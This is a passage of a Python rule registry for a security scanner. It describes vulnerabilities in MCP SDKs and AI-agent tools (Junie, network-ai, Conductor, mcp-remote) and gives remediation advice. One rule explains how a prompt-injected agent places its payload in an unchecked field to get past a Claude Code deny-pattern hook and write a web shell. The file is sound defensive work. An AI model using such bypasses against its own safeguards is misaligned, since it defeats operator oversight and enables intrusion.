    "Upgrade `@jetbrains/junie` to 2548.5.0 (Junie 26.8.3) or later and pin it. "
    "`@jetbrains/junie-cli` stopped at 1468.30.0, so move to `@jetbrains/junie`. "
    "Until then, do not start Junie in a repository you do not trust, and read its "
    "`.junie/mcp/mcp.json` first.",
    sarif_name="JunieCliUntrustedProjectMcpConfig",
    cve_references=["CVE-2026-111091"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-TRUST-01"],
    limitations=(
        "Reports `@jetbrains/junie` and `@jetbrains/junie-cli` from 888.0.0 up to "
        "2548.5.0 where a project states the version in a package.json or lockfile "
        "entry. An unpinned reference resolves to the newest release and is not "
        "reported. Junie is usually installed globally, by its install script, "
        "Homebrew or `npm install -g`, which no file AAK reads. The launcher installs "
        "one build, and Junie's shim can fetch and run another (`--use-version`, or a "
        "channel's latest build), so a stated version does not prove which build "
        "runs. `@jetbrains/junie-cli` releases below 888.0.0, which install the EAP "
        "builds of August 2025 to February 2026, and its empty 1.0.0 are not "
        "reported. A project's own `.junie/mcp/mcp.json` is not read. A file over "
        "2 MB, or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-JAVASDK-CVE-2026-108395-001",
    "MCP Java SDK 0.8.0 to 0.18.3, 1.0.0 to 1.1.3 and 2.0.0: the Servlet HTTP server transports read request bodies of any size",
    "The MCP Java SDK's Servlet-based server transports "
    "(`HttpServletSseServerTransportProvider`, "
    "`HttpServletStreamableServerTransportProvider` and "
    "`HttpServletStatelessServerTransport`) read a POST body line by line into a "
    "`StringBuilder` with no size limit. An unauthenticated client that can reach "
    "one can stream an arbitrarily large body, chunked or not, until the JVM runs "
    "out of heap (CVE-2026-108395, CVSS 3.1 7.5, CWE-770). The transports are in "
    "`io.modelcontextprotocol.sdk:mcp` from 0.8.0 to 0.12.1 and in `mcp-core` from "
    "0.13.0, and the `mcp` bundle depends on `mcp-core` at its own version. Checked "
    "in the source: the SSE provider reads without a limit from 0.8.0, where it "
    "arrives, and all three do at 0.12.1, 0.13.0, 0.18.3, 1.0.0-RC3, 1.0.2, 1.1.3, "
    "2.0.0-M1, 2.0.0-RC1 and 2.0.0. 0.18.4, 1.1.4 and 2.0.1 read through a bounded "
    "`readBody`, and the 1.0.x line has no fixed release.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp` or `mcp-core`, or the `mcp-bom` that sets their version, to "
    "0.18.4, 1.1.4 or 2.0.1 or later on your release line, or to 2.1.0, the newest. "
    "On 1.0.x, move to 1.1.4. Until then, put a reverse proxy or gateway that limits "
    "the request body size in front of the server.",
    sarif_name="McpJavaSdkServletUnboundedBody",
    cve_references=["CVE-2026-108395"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04", "ASI08"],
    adversa_references=["ADV-DOS-01"],
    limitations=(
        "Dependency-level detection on JVM manifests only: `build.gradle`, "
        "`build.gradle.kts`, `gradle/libs.versions.toml` and `pom.xml`. Reports "
        "`io.modelcontextprotocol.sdk:mcp` and `mcp-core` from 0.8.0 below 0.18.4, "
        "from 1.0.0 below 1.1.4, and at 2.0.0, where a version resolves in the file, "
        "directly or through an `mcp-bom` in the same file. 1.0.0-RC3 reads as 1.0.0 "
        "and the 2.0.0 milestones as 2.0.0, and both are affected. It reads versions, "
        "not code, so a server that uses only stdio, or has a body-size limit in "
        "front of it, is reported too. The SDK that Spring AI's starters or "
        "`spring-ai-bom` pull in is not read, and neither is a dynamic version or a "
        "`version.ref` to a catalog outside the scanned tree. 0.7.0's older "
        "`HttpServletSseServerTransport` reads the body the same way, but the CVE "
        "record starts at 0.8.0, so 0.7.0 is not reported."
    ),
)


# ---------------------------------------------------------------------------
# 2026-10-16 batch (#1001-#1005), with CVE-2026-59951, which the watcher had not
# filed yet. Four new rules; the NetLicensing and MCP Python SDK pins move their
# floors (see those rules).
# ---------------------------------------------------------------------------

_r(
    "AAK-MCP-SDK-CVE-2026-59951-001",
    "MCP Python SDK 1.8.0 to 1.29.x and 2.0.x/2.1.x: stateful Streamable HTTP sessions never expire",
    "The MCP Python SDK (`mcp` on PyPI) keeps a stateful Streamable HTTP session "
    "(FastMCP, `Server.streamable_http_app()`, `StreamableHTTPSessionManager`) with "
    "no idle expiry and no limit on how many are open. DELETE, refused opening "
    "requests and completed sessions do not reliably discard their entries, and "
    "each entry can keep its parsed initialize parameters, so a client that can "
    "reach the endpoint grows the server's memory with short ordinary requests "
    "until it restarts (CVE-2026-59951, CVSS 4.0 6.9, CWE-770). Checked in the "
    "source: the session manager arrives in 1.8.0, 1.29.1 still has only an "
    "optional idle timeout that is off by default, and 1.30.0 and 2.2.0 add a "
    "30-minute default idle timeout and a 10,000-session cap. Stateless HTTP, "
    "stdio and SSE are not affected.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Upgrade `mcp` to 1.30.0 or later, or to 2.2.0 or later on the 2.x line, and pin "
    "it. Until then, pass `session_idle_timeout` to the session manager, or run the "
    "server stateless.",
    sarif_name="McpPythonSdkUnboundedSessions",
    cve_references=["CVE-2026-59951"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04", "ASI08"],
    adversa_references=["ADV-DOS-01"],
    limitations=(
        "Reads `mcp` from 1.8.0 below 1.30.0, and from 2.0.0 below 2.2.0, where a "
        "version is stated, in the same files as the HIGH `mcp` pin: requirements*.txt "
        "at any depth and, at the project root only, pyproject.toml, Pipfile, "
        ".mcp.json, mcp.json, claude_desktop_config.json and the Pipfile.lock, "
        "poetry.lock and uv.lock lockfiles. A bare `mcp` is not reported. It reads "
        "versions, not code, so a stateless, stdio-only or SSE-only server, or one "
        "that already sets `session_idle_timeout`, is reported too. A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-NETWORKAI-CVE-2026-109331-001",
    "network-ai 5.14.0 to 5.15.1: ClaudeHookBridge checks deny patterns against one truncated field",
    "Network-AI (`network-ai` on npm) ships ClaudeHookBridge, a Claude Code PreToolUse "
    "hook that blocks tool calls matching an operator's `denyPatterns`. It checks the "
    "patterns against the first candidate field present in the tool input only, so "
    "an agent steered by prompt injection puts the payload in another field, such as "
    "a Write tool's `content` or an MCP tool's script parameter, beside a harmless "
    "`file_path` or `command`, and writes a web shell or runs a script "
    "(CVE-2026-109331, CVSS 3.1 7.4, CWE-436). Before 5.15.1 it also checks only "
    "the first 500 characters of that field, while Claude Code runs all of it "
    "(CVE-2026-73614, CVSS 3.1 8.8). Checked in the npm tarballs: the bridge is "
    "absent in 5.13.4 and present from 5.14.0, 5.15.1 drops the truncation, and "
    "5.15.2 matches the patterns against every field.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `network-ai` to 5.15.2 or later and pin it, in the hook command too "
    "(`npx -y -p network-ai@5.15.2 ...`). Until then, do not rely on `denyPatterns` "
    "alone: run the hook in enforce mode with grants, and keep Claude Code's own "
    "permission deny rules for the commands that matter.",
    sarif_name="NetworkAiHookDenyBypass",
    cve_references=[
        "CVE-2026-109331",
        # The 2026-08-14 ledger called this one unpinnable: no package carried the
        # bridge's name. It ships in `network-ai`, fixed in 5.15.1.
        "CVE-2026-73614",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-TRUST-02"],
    limitations=(
        "Reads `network-ai` from 5.14.0 below 5.15.2 where a project states the "
        "version: a package.json or lockfile entry, or a versioned launch in .mcp.json, "
        "mcp.json or claude_desktop_config.json. The README's hook command and plugin "
        "launch are unpinned (`npx -y -p network-ai ...`) and resolve to 5.15.4, which "
        "is fixed, so they are not reported, and the hook command in "
        "`.claude/settings.json` is not read at all, pinned or not. A file over 2 MB, "
        "or a lockfile over 32 MiB, is not read."
    ),
)

_r(
    "AAK-MCP-CONDUCTOR-CVE-2026-109402-001",
    "Conductor image from 3.22.0: the LIST_MCP_TOOLS task connects to any mcpServer URL (SSRF, no fixed release)",
    "Conductor OSS, the workflow orchestration server, has AI workers that include "
    "an MCP client. Its `LIST_MCP_TOOLS` task passes the workflow's `mcpServer` input "
    "to `MCPService.listTools`, which connects to that URL with no check on where it "
    "points, so whoever can define or run a workflow can make the server request "
    "internal hosts or a cloud metadata endpoint and read the answer "
    "(CVE-2026-109402, CVSS 3.1 6.3, CWE-918). Checked in the source: MCPService "
    "arrives in 3.22.0 and has no destination check on `main`, and the image "
    "`conductoross/conductor` bundles the AI module. The AI workers run only when "
    "`conductor.integrations.ai.enabled` is true, which the published image's "
    "configuration does not set. There is no fixed release, and upstream closed "
    "SSRF guards for the HTTP task as an enterprise feature.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Leave `conductor.integrations.ai.enabled` off unless "
    "you use the AI workers, let only trusted users define and run workflows, and "
    "block the server's egress to internal ranges and metadata addresses.",
    sarif_name="ConductorMcpListToolsSsrf",
    cve_references=["CVE-2026-109402"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-SSRF-01"],
    limitations=(
        "Reads `conductoross/conductor` references from 3.22.0 up to and including "
        "4.0.0-alpha.1, the newest tag, and `latest`, pushed on 2026-10-14, in "
        "compose files, Kubernetes manifests, Helm values, Dockerfiles and MCP "
        "configs. It reads the tag, not the configuration, so a server with the AI "
        "workers off, the image's default, is reported too. 3.22.0-rc1, which "
        "predates the task, also reads as 3.22.0 and is reported. The README's "
        "`:next` tag states no version and is not read, and neither is the "
        "`orkesio/orkes-conductor-community` image or a locally built `conductor:server`."
    ),
)

_r(
    "AAK-MCP-REMOTE-CVE-2026-108716-001",
    "mcp-remote from 0.8.0 launched with --device-code: client secret and tokens over plain HTTP (no fixed release)",
    "mcp-remote's device-code sign-in (`--device-code`, from 0.8.0) posts the OAuth "
    "client secret to the device-authorization and token endpoints the server's "
    "metadata names, and takes the access and refresh tokens back, without requiring "
    "https. When a discovered endpoint is a non-loopback `http://` URL, an on-path "
    "attacker captures the secret and the tokens (CVE-2026-108716, CVSS 3.1 5.3, "
    "CWE-319). Checked in the source: `authorizeWithDeviceCode` arrives in 0.8.0, "
    "runs only when the launch passes `--device-code`, and calls `fetch` on both "
    "endpoints with no scheme check; `src/lib/device-authorization.ts` is unchanged "
    "from 0.14.3 to 0.15.1, the newest release, so there is no fixed release.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "There is no fixed release. Sign in without `--device-code`, or check that the "
    "server's OAuth metadata names https device-authorization and token endpoints "
    "before you use it, and rotate a client secret that may have crossed plain "
    "HTTP.",
    sarif_name="McpRemoteDeviceCodeCleartext",
    cve_references=["CVE-2026-108716"],
    owasp_mcp_references=["MCP01:2025", "MCP04:2025"],
    owasp_agentic_references=["ASI03", "ASI04"],
    adversa_references=["ADV-TOKEN-06"],
    limitations=(
        "Reports an MCP config or package.json script that launches `mcp-remote` with "
        "`--device-code`, at a stated version from 0.8.0 or with none, since the newest "
        "release is affected. A launch without the flag is not reported, and neither "
        "is a dependency entry or a lockfile, which record no arguments. A launch in "
        "`.cursor/mcp.json` or `.vscode/mcp.json` is not read. It cannot "
        "see the endpoints the server will "
        "advertise, so a server whose endpoints are https is reported too. A file over "
        "2 MB, or a lockfile over 32 MiB, is not read."
    ),
)


def all_rule_ids() -> list[str]:
    """Return all registered rule IDs in registration order."""
    return list(RULES.keys())


def rules_for_category(category: Category) -> list[RuleDefinition]:
    """Return all rules belonging to the given category.

    Args:
        category: The Category enum value to filter by.

    Returns:
        A list of RuleDefinition objects matching the category.
    """
    return [r for r in RULES.values() if r.category == category]


def _apply_aicm_overlay() -> None:
    """Apply _AICM_TAGS to registered rules. Missing rule IDs are ignored
    so the overlay doesn't fail the module if someone removes a rule."""
    for rid, controls in _AICM_TAGS.items():
        rule = RULES.get(rid)
        if rule is None:
            continue
        for cid in controls:
            if cid not in rule.aicm_references:
                rule.aicm_references.append(cid)


_apply_aicm_overlay()
